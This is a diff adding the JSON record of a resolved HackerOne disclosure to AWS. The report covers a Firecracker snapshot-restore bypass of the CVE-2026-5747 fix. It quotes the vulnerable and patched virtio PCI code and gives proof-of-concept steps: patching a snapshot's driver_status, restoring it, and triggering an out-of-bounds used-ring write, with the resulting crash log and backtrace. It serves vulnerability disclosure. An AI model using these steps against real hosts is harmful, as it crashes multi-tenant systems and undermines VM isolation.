@@ -1,0 +1,113 @@
+{
+  "id": 3738654,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzM4NjU0",
+  "url": "https://hackerone.com/reports/3738654",
+  "title": " Firecracker Out-of-bounds Read/Write Local Privilege Escalation Vulnerability",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "none",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-15T16:29:06.983Z",
+  "submitted_at": "2026-05-15T16:29:08.060Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "terrynini38514",
+    "url": "/terrynini38514",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 84809,
+    "url": "https://hackerone.com/aws_vdp",
+    "handle": "aws_vdp",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/fgfqam8gl7lzo8u8v0kiphkxfyt8/1d3351b56b27c9bb56ce22821a57514a7210186a77aefb760cd2113272723c1f"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "AWS VDP",
+      "twitter_handle": "amazon",
+      "website": "https://aws.amazon.com/",
+      "about": "Amazon Web Services (AWS) is a secure cloud services platform, offering compute power and other functionality to help businesses scale and grow. "
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2026-5747"
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-06-11T15:00:03.092Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-06-11T15:00:02.479Z",
+  "team_member_agreed_on_going_public_at": "2026-06-11T14:53:23.339Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Title:\n\nFirecracker Out-of-bounds Read/Write Local Privilege Escalation Vulnerability\n\n## Acknowledgements\n\n████████ (████████) of ████████ and ████████ (████████)\n\n## Affect Product\n\nFirecracker v1.15.1 (Latest)\n\n## Description:\n\n### Original vulnerability: direct post-activation PCI queue mutation\n\nThe original issue behind CVE-2026-5747 was in the virtio PCI common configuration write path. In the vulnerable code, queue configuration registers were written directly into the live `Queue` object without checking whether the device had already been activated.\n\nVulnerable code in the old tree:\n\nFile: `src/vmm/src/devices/virtio/transport/pci/common_config.rs`  \nLines: `202`, `219`, `314-330`\n\n```rust\n0x18 => self.with_queue_mut(queues, |q| q.size = value),\n...\n0x1c => self.with_queue_mut(queues, |q| {\n    if value != 0 {\n        q.ready = value == 1;\n    }\n}),\n...\n0x20 => self.with_queue_mut(locked_device.queues_mut(), |q| {\n    lo(&mut q.desc_table_address, value)\n}),\n0x24 => self.with_queue_mut(locked_device.queues_mut(), |q| {\n    hi(&mut q.desc_table_address, value)\n}),\n0x28 => self.with_queue_mut(locked_device.queues_mut(), |q| {\n    lo(&mut q.avail_ring_address, value)\n}),\n0x2c => self.with_queue_mut(locked_device.queues_mut(), |q| {\n    hi(&mut q.avail_ring_address, value)\n}),\n0x30 => self.with_queue_mut(locked_device.queues_mut(), |q| {\n    lo(&mut q.used_ring_address, value)\n}),\n0x34 => self.with_queue_mut(locked_device.queues_mut(), |q| {\n    hi(&mut q.used_ring_address, value)\n}),\n```\n\nThat was dangerous because queue activation validates queue geometry only once and then caches raw host pointers derived from that geometry.\n\nFile: `src/vmm/src/devices/virtio/queue.rs`  \nLines: `342-369`\n\n```rust\npub fn initialize<M: GuestMemory>(&mut self, mem: &M) -> Result<(), QueueError> {\n    ...\n    self.desc_table_ptr =\n        self.get_aligned_slice_ptr(mem, self.desc_table_address, self.desc_table_size(), 16)?;\n    self.avail_ring_ptr =\n        self.get_aligned_slice_ptr(mem, self.avail_ring_address, self.avail_ring_size(), 2)?;\n    self.used_ring_ptr =\n        self.get_aligned_slice_ptr(mem, self.used_ring_address, self.used_ring_size(), 4)?;\n    Ok(())\n}\n```\n\nAfter activation, later queue operations trust `self.size` for indexing, but still dereference the cached pointers. If the guest changes queue fields after activation, Firecracker can perform out-of-bounds virtqueue reads and writes through stale pointers.\n\n### How the fix works\n\nThe fix in `1.14.4` / `1.15.1` adds a guard that only permits queue configuration writes while the device is in the virtio setup state `ACKNOWLEDGE | DRIVER | FEATURES_OK` (`0xb`), before `DRIVER_OK` and before backend activation is complete.\n\nFixed code:\n\nFile: `src/vmm/src/devices/virtio/transport/pci/common_config.rs`  \nLines: `237-254`, `272-294`, `396-413`\n\n```rust\nfn update_queue_field<F: FnOnce(&mut Queue)>(&mut self, queues: &mut [Queue], f: F) {\n    let status = self.driver_status;\n    if status == (ACKNOWLEDGE | DRIVER | FEATURES_OK) {\n        self.with_queue_mut(queues, f);\n    } else {\n        warn!(\n            \"pci: queue config write not allowed in device status {:#x}\",\n            status\n        );\n    }\n}\n...\nQUEUE_SIZE => self.update_queue_field(queues, |q| q.size = value),\n...\nQUEUE_ENABLE => self.update_queue_field(queues, |q| {\n    if value != 0 {\n        q.ready = value == 1;\n    }\n}),\n...\nQUEUE_DESC_LO => self.update_queue_field(locked_device.queues_mut(), |q| {\n    lo(&mut q.desc_table_address, value)\n}),\n...\nQUEUE_USED_HI => self.update_queue_field(locked_device.queues_mut(), |q| {\n    hi(&mut q.used_ring_address, value)\n}),\n```\n\nSo the intended invariant is:\n\n- queue pointers are initialized once using validated geometry\n- once the backend is active, PCI queue fields are no longer writable\n\n### Bypass path: hostile snapshot restore recreates the forbidden state\n\nThe bypass exists because snapshot restore reconstructs queue activation state and PCI `driver_status` from different serialized fields, but does not validate that they are consistent with each other.\n\n1. Queue restore rebuilds cached raw pointers whenever the saved virtio device state says the queue is already activated.\n\nFile: `src/vmm/src/devices/virtio/persist.rs`  \nLines: `88-111`\n\n```rust\nfn restore(\n    constructor_args: Self::ConstructorArgs,\n    state: &Self::State,\n) -> Result<Self, Self::Error> {\n    let mut queue = Queue {\n        max_size: state.max_size,\n        size: state.size,\n        ready: state.ready,\n        desc_table_address: GuestAddress(state.desc_table),\n        avail_ring_address: GuestAddress(state.avail_ring),\n        used_ring_address: GuestAddress(state.used_ring),\n        ...\n    };\n    if constructor_args.is_activated {  //--[1]\n        queue.initialize(&constructor_args.mem)?;\n    }\n    Ok(queue)\n}\n```\n\n2. PCI restore independently trusts `state.device_activated` and re-activates the backend.\n\nFile: `src/vmm/src/devices/virtio/transport/pci/device.rs`  \nLines: `437-459`\n\n```rust\nlet mut virtio_pci_device = VirtioPciDevice {\n    ...\n    common_config: virtio_common_config,\n    ...\n    device_activated: Arc::new(AtomicBool::new(state.device_activated)), //--[1]\n    ...\n};\n\nif state.device_activated {\n    virtio_pci_device\n        .device\n        .lock()\n        .expect(\"Poisoned lock\")\n        .activate(\n            virtio_pci_device.memory.clone(),\n            virtio_pci_device.virtio_interrupt.as_ref().unwrap().clone(),\n        );\n}\n```\n\n3. The queue-write gate still checks only `common_config.driver_status`.\n\nFile: `src/vmm/src/devices/virtio/transport/pci/common_config.rs`  \nLines: `244-247`\n\n```rust\nlet status = self.driver_status;\nif status == (ACKNOWLEDGE | DRIVER | FEATURES_OK) {\n    self.with_queue_mut(queues, f);\n}\n```\n\nThis means a hostile snapshot can restore:\n\n- `VirtioDeviceState.activated = true`\n- `VirtioPciDeviceState.device_activated = true`\n- `VirtioPciCommonConfigState.driver_status = 0xb`\n\nAfter restore, Firecracker has:\n\n- an already active backend\n- queues whose raw pointers were reinitialized from the saved geometry\n- PCI queue writes permitted again because `driver_status == 0xb`\n\nThat recreates the same stale-pointer condition that the original fix was meant to prevent.\n\n### Confirmed consequence\n\nUsing the hostile restore state above, the guest can mutate the live queue again after restore and revive the old stale used-ring path:\n\n- out-of-bounds avail-ring read relative to the originally validated queue\n- out-of-bounds descriptor-table read relative to the originally validated queue\n- out-of-bounds used-ring write through the stale `used_ring_ptr`\n\n## Proof of Concept\n\n### Building the Firecracker\n\nBuild Firecracker in the normal way:\n\n```bash\ngit clone https://github.com/firecracker-microvm/firecracker.git\ncd firecracker/\ngit checkout v1.15.1\n./tools/devtool checkenv\nsudo systemctl start docker\nsudo ./tools/devtool build --release\n```\n\nExpected binaries:\n\n```bash\nfile ./build/cargo_target/x86_64-unknown-linux-musl/release/firecracker\nfile ./build/cargo_target/x86_64-unknown-linux-musl/release/jailer\n```\n\n### Building PoC\n\n**Notice**: Most scripts use default paths under `████████...`. Update those paths to match your local environment before running them.\n\n#### 1. Build the guest OS\n\n```sh\ncd ~/firecracker/resources\ngit clone --depth=1 https://github.com/amazonlinux/linux\n```\n\nThe split-probe kernel builder expects a local Amazon Linux kernel tree at:\n\n```text\n~/firecracker/resources/linux\n```\n\nAfter cloning, prepare the kernel config.\n\nUse the base microvm config and then merge in the PCI fragment with the kernel's config merge helper:\n\n```sh\ncp ~/firecracker/resources/guest_configs/microvm-kernel-ci-x86_64-6.1.config \\\n   ~/firecracker/resources/linux/.config\n~/firecracker/resources/linux/scripts/config --file ~/firecracker/resources/linux/.config \\\n   --enable PCI \\\n   --enable PCI_MMCONFIG \\\n   --enable PCI_MSI \\\n   --enable PCIEPORTBUS \\\n   --enable VIRTIO_PCI \\\n   --enable PCI_HOST_COMMON \\\n   --enable PCI_HOST_GENERIC \\\n   --enable BLK_MQ_PCI \\\n   --enable VIRTIO_BLK \\\n   --enable EXT4_FS\nmake -C ~/firecracker/resources/linux olddefconfig\n```\n\nIf a reviewer prefers a quick manual merge, appending `pcie.config` and then running\n`olddefconfig` also works, but it produces noisy override warnings and is easier to get wrong.\n\nBefore building, sanity-check that the guest kernel config really has PCI enabled:\n\n```sh\ngrep -E '^(CONFIG_PCI=|CONFIG_VIRTIO_PCI=|CONFIG_PCI_MSI=|CONFIG_VIRTIO_BLK=|CONFIG_EXT4_FS=)' \\\n    ~/firecracker/resources/linux/.config\n```\n\nExpected output should include at least:\n\n```text\nCONFIG_PCI=y\nCONFIG_PCI_MSI=y\nCONFIG_VIRTIO_BLK=y\nCONFIG_VIRTIO_PCI=y\nCONFIG_EXT4_FS=y\n```\n\nUnzip the attachment files then move it to the `~/pci_snapshot_restore_bypass_demo/`.\nCopy the poc files then build the split-probe kernel:\n\n```sh\nmkdir ~/firecracker/resources/kernel_poc/\ncp ~/pci_snapshot_restore_bypass_demo/split_probe_builder/resources/kernel_poc/fc_pci_queue_split_probe_builtin.c ~/firecracker/resources/kernel_poc/fc_pci_queue_split_probe_builtin.c\ncp ~/pci_snapshot_restore_bypass_demo/split_probe_builder/tools/build_fc_pci_split_probe_kernel.sh ~/firecracker/tools\ncd ~/firecracker/tools\n./build_fc_pci_split_probe_kernel.sh\n```\n\nExpected output:\n\n```text\n/tmp/fc-pci-split-probe-kernel/vmlinux-fc-pci-split-probe\n```\n\n#### 2. Build the guest image\n\n```sh\ncd ~/pci_snapshot_restore_bypass_demo/\n./build_guest_image.sh\n```\n\n#### 3. Save a normal snapshot\n\n```sh\n./start_normal_instance_and_snapshot.sh\n```\n\nThis writes:\n\n- `/tmp/fc-normal-snapshot/orig.vmstate`\n- `/tmp/fc-normal-snapshot/orig.mem`\n\n#### 4. Mutate the snapshot\n\n1. Build the patcher:\n\nremember to change the vmm path in `~/pci_snapshot_restore_bypass_demo/snapshot_patcher/Cargo.toml` first\n```toml\nvmm = { path = \"████████Desktop/firecracker/firecracker/src/vmm\" }\n```\n\n```sh\ncd ~/pci_snapshot_restore_bypass_demo/snapshot_patcher\ncargo build --offline\n```\n\nIf `--offline` fails:\n\n```sh\ncd ~/pci_snapshot_restore_bypass_demo/snapshot_patcher\ncargo build\n```\n\n2. Mutate the snapshot:\n\n```sh\n~/pci_snapshot_restore_bypass_demo/snapshot_patcher/target/debug/patch_snapshot \\\n/tmp/fc-normal-snapshot/orig.vmstate \\\n/tmp/fc-normal-snapshot/patched.vmstate\n```\n\nExpected output:\n\n```text\nbefore_driver_status=0xf\nafter_driver_status=0xb\ntransport_device_activated=true\nbackend_virtio_activated=true\n```\n\nThat is the malformed snapshot:\n\n- original snapshot stays at `/tmp/fc-normal-snapshot/orig.vmstate`\n- mutated snapshot becomes `/tmp/fc-normal-snapshot/patched.vmstate`\n\nTool needed:\n\n- the local Rust tool in `pci_snapshot_restore_bypass_demo/snapshot_patcher`\n- source entry point: `pci_snapshot_restore_bypass_demo/snapshot_patcher/src/main.rs`\n\n### Executing PoC\n\n#### 1. Start a fresh Firecracker process\n\n```sh\ncd ~/pci_snapshot_restore_bypass_demo\n./start_firecracker.sh\n```\n\nThis starts Firecracker with:\n\n- API socket: `/tmp/fc-start/api.sock`\n- log: `/tmp/fc-start/firecracker.log`\n- PID file: `/tmp/fc-start/firecracker.pid`\n\nSo after it print the PID, you can `sudo gdb -p <PID>`\n\n#### 2. Load the mutated snapshot and resume the VM\n\n```sh\n./load_mutated_snapshot.sh\n```\n\nGuest OS will trigger out-of-bounds write after 10 seconds.\n\nBy default this sends:\n\n- `/tmp/fc-normal-snapshot/patched.vmstate`\n- `/tmp/fc-normal-snapshot/orig.mem`\n\nto the Firecracker process listening on `/tmp/fc-start/api.sock`.\n\n#### 3. Observe the restored state\n\n```sh\ncat /tmp/fc-start/firecracker.log\n\n[   10.522823] queue_size mutated live to 65535; issuing 1 post-mutation request(s) through the stale queue state\n[   10.525730] post-mutation request 1/1: pop avail.ring[65534], consume desc[1], and write used[65534] past guest RAM\n2026-04-09T04:43:36.312507266 [anonymous-instance:main] Shutting down VM after intercepting signal 11, code 1.\n```\n\nAt this point the malformed snapshot has been restored and resumed. This reproduces the restore-time bypass state:\n\n- backend remains activated\n- PCI `driver_status` is rolled back to `0xb`\n- post-activation PCI queue mutation becomes possible again\n\nThe script above restores the vulnerable state. The stronger guest-triggered crash consequence is then exercised by the companion split-queue crash flow.\n\n### Stack Trace\n\nWhen the reviewer attaches with GDB at the `restore_loaded_paused` stage and then resumes the VM, the expected backtrace shows the crash in the virtio queue used-ring write path. The crash occurs because the used-ring write goes past guest RAM and lands in an unmapped page.\n\n```text\n#0  0x000074fe21990afc in vmm::devices::virtio::rng::device::Entropy::process_entropy_queue ()\n#1  0x000074fe2198fce0 in vmm::devices::virtio::rng::event_handler::<impl event_manager::MutEventSubscriber for vmm::devices::virtio::rng::device::Entropy>::process ()\n#2  0x000074fe2186b9aa in event_manager::manager::EventManager<S>::run_with_timeout ()\n#3  0x000074fe21862509 in firecracker::api_server_adapter::run_with_api ()\n#4  0x000074fe2186910b in firecracker::main ()\n#5  0x000074fe21871393 in std::sys::backtrace::__rust_begin_short_backtrace ()\n#6  0x000074fe218aa643 in main ()\n```\n\nThis confirms that the bypass revives the original stale `used_ring_ptr` primitive rather than only triggering the easier `InvalidAvailIdx` panic path.\n\n## Impact\n\n## Summary:\n\nFirecracker is an open source virtualization technology purpose-built for secure multi-tenant container and function workloads. A variant of CVE-2026-5747 exists where, under hostile snapshot restore conditions, a guest can bypass the post-activation virtio PCI queue-write fix by restoring an active device with rolled-back PCI driver_status, reviving stale virtqueue pointer use and enabling out-of-bounds virtqueue access, including a host-crashing out-of-bounds used-ring write.",
+  "weakness": {
+    "id": 8,
+    "name": "Out-of-bounds Read"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 0,
+  "voters": [],
+  "severity": {
+    "rating": "none",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 742167,
+    "asset_type": "OTHER",
+    "asset_identifier": "Firecracker",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
